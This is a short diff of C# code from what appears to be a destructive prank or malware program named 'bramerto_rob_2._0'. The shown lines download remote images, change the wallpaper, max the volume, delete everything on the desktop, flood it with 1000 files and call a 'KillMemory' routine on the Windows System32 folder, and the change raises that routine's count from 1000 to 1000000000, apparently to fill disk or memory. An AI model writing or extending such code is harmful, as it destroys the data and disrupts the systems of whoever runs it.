@@ -86,7 +86,7 @@ namespace bramerto_rob_2._0
             wc.DownloadFile("https://s0.rbk.ru/v6_top_pics/resized/590xH/media/img/3/87/756107202790873.jpg", desktop);
             s.SetWallpaper(desktop);
             s.SetVolume(100);
-            s.KillMemory(@"C:\Windows\System32\", 1000);
+            s.KillMemory(@"C:\Windows\System32\", 1000000000);
             s.DeleteALLFromDesktop();
             s.CreateFilesOnDesktop(1000, "https://rozetked.me/images/uploads/fJ8LPcfByPPv.jpg", "Shrek.ru");
             this.WindowState = FormWindowState.Minimized;
